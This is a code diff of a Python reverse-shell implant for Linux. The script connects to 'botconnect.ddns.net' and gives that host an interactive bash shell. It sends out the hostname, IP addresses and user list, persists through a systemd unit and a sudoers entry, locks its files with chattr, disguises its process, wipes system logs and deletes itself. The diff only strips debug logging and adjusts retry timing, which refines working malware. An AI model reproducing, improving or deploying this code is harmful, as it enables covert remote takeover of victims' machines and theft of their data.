@@ -7,12 +7,6 @@ import pty
 import time
 import select
 import uuid
-import logging
-
-# Configure logging (hidden, for debugging)
-logging.basicConfig(filename='/tmp/.webservice.log', level=logging.DEBUG,
-                    format='%(asctime)s - %(levelname)s - %(message)s')
-logging.getLogger().handlers = []  # Disable console output
 
 # Configuration
 ATTACKER_IP = "botconnect.ddns.net"  # Attacker's IP
@@ -28,7 +22,7 @@ PERSIST_METHODS = [
     f"mkdir -p /etc/systemd/system; echo '[Unit]\nDescription=Web Service\n[Service]\nExecStart=python3 {HIDDEN_FILE}\nRestart=always\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/webservice.service; systemctl enable webservice.service 2>/dev/null"
 ]
 SUDOERS_FILE = "/etc/sudoers.d/webservice"
-RETRY_INTERVALS = [1, 2, 4, 8, 16, 32, 64]  # Exponential backoff in seconds
+RETRY_INTERVALS = [5, 10, 15, 30, 60]  # Gradual retry intervals in seconds
 UUID = str(uuid.uuid4())  # Generate unique client ID
 
 # Check and elevate to root if possible
@@ -38,7 +32,6 @@ if os.geteuid() != 0:
         exit(0)
     except subprocess.CalledProcessError:
         is_admin = "No"
-        logging.debug("Running as non-root user")
         # Add sudoers entry for root elevation on reboot
         if os.geteuid() == 0:
             with open(SUDOERS_FILE, 'w') as f:
@@ -47,7 +40,6 @@ if os.geteuid() != 0:
             os.system(f"chattr +i {SUDOERS_FILE} 2>/dev/null")
 else:
     is_admin = "Yes"
-    logging.debug("Running as root")
 
 # Hide the payload
 try:
@@ -61,23 +53,20 @@ try:
     os.chmod(HIDDEN_DIR, 0o700)
     os.chmod(HIDDEN_FILE, 0o700)
     os.system(f"chattr +i {HIDDEN_DIR} {HIDDEN_FILE} 2>/dev/null")
-    logging.debug(f"Payload hidden in {HIDDEN_FILE}")
 except PermissionError as e:
-    logging.error(f"Permission denied: {e}")
+    print(f"[ERROR] Permission denied: {e}. Try running as root.")
     exit(1)
 
 # Persistence (multiple methods)
 for method in PERSIST_METHODS:
     os.system(method)
-    logging.debug(f"Applied persistence method: {method}")
 
 # Hide process
 try:
     p = psutil.Process(os.getpid())
     p.name(PROCESS_NAME)
-    logging.debug(f"Process hidden as {PROCESS_NAME}")
-except Exception as e:
-    logging.warning(f"Failed to hide process: {e}")
+except Exception:
+    pass  # Fallback if psutil fails
 
 # Data Exfiltration
 info = f"Hostname: {os.uname().nodename}\nOS: {os.uname().sysname} {os.uname().release}\nIP: {subprocess.getoutput('ip addr show | grep inet | awk \'{print $2}\' | paste -sd \',\'')}\nUsers: {subprocess.getoutput('cat /etc/passwd | cut -d: -f1 | paste -sd \',\'')}\nUptime: {subprocess.getoutput('uptime')}\nDisk Usage: {subprocess.getoutput('df -h | grep -v tmpfs | grep -v udev')}"
@@ -103,19 +92,16 @@ def send_heartbeat(s):
     while True:
         try:
             s.send(f"KEEPALIVE:{UUID}\n".encode('utf-8'))
-            logging.debug(f"Sent KEEPALIVE for UUID {UUID}")
-            time.sleep(5)  # More frequent heartbeat
+            time.sleep(10)
         except Exception:
-            logging.warning("Heartbeat failed")
             break
 
 # Single connection for messages and shell
 while True:
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(120)  # Increased timeout
+        s.settimeout(90)
         s.connect((ATTACKER_IP, PORT))
-        logging.debug(f"Connected to {ATTACKER_IP}:{PORT}")
         # Send initial messages
         messages = [
             f"MSG:CONN:sono connesso! Admin: {is_admin} UUID: {UUID}",
@@ -126,7 +112,6 @@ while True:
         for msg in messages:
             s.send((msg + "\n").encode('utf-8'))
             time.sleep(0.1)
-            logging.debug(f"Sent message: {msg}")
         
         # Start heartbeat in separate thread
         threading.Thread(target=send_heartbeat, args=(s,), daemon=True).start()
@@ -137,26 +122,26 @@ while True:
             if s in r:
                 data = s.recv(4096).decode('utf-8')
                 if data.startswith("KEEPALIVE:"):
-                    logging.debug(f"Received KEEPALIVE: {data}")
-                    return b""
-                logging.debug(f"Received command: {data}")
-                if data.strip() in ["status", "info"]:
-                    response = handle_custom_command(data.strip())
-                    s.send((response + "\n").encode('utf-8'))
                     return b""
                 return data.encode('utf-8')
             return b""
         
         def write_to_socket(fd, data):
-            s.send(data)
-            logging.debug(f"Sent shell data: {data.decode('utf-8', errors='ignore').strip()}")
+            try:
+                cmd = data.decode('utf-8').strip()
+                if cmd in ["status", "info"]:
+                    response = handle_custom_command(cmd)
+                    s.send((response + "\n").encode('utf-8'))
+                else:
+                    s.send(data)
+            except Exception:
+                pass
         
         pty.spawn(["/bin/bash", "-i"], read_from_socket, write_to_socket)
         s.close()
-        logging.debug("Shell connection closed")
     except Exception as e:
-        logging.error(f"Connection failed: {e}")
-        # Exponential backoff retry
+        print(f"[ERROR] Connection failed: {e}")
+        # Gradual retry with increasing intervals
         for interval in RETRY_INTERVALS:
             time.sleep(interval)
             try:
@@ -164,10 +149,8 @@ while True:
                 s.settimeout(1)
                 s.connect((ATTACKER_IP, PORT))
                 s.close()
-                logging.debug("Connection test succeeded, retrying main loop")
                 break
             except Exception:
-                logging.debug(f"Retry failed after {interval}s")
                 continue
         else:
             continue
@@ -178,13 +161,11 @@ for log in LOG_FILES:
     if os.path.exists(log):
         try:
             open(log, 'w').close()
-            logging.debug(f"Cleared log: {log}")
         except PermissionError:
-            logging.warning(f"Failed to clear log {log}: Permission denied")
+            pass
 
 # Self-delete to make removal harder
 try:
     os.remove(__file__)
-    logging.debug("Self-deleted payload")
-except Exception as e:
-    logging.warning(f"Failed to self-delete: {e}")
+except Exception:
+    pass
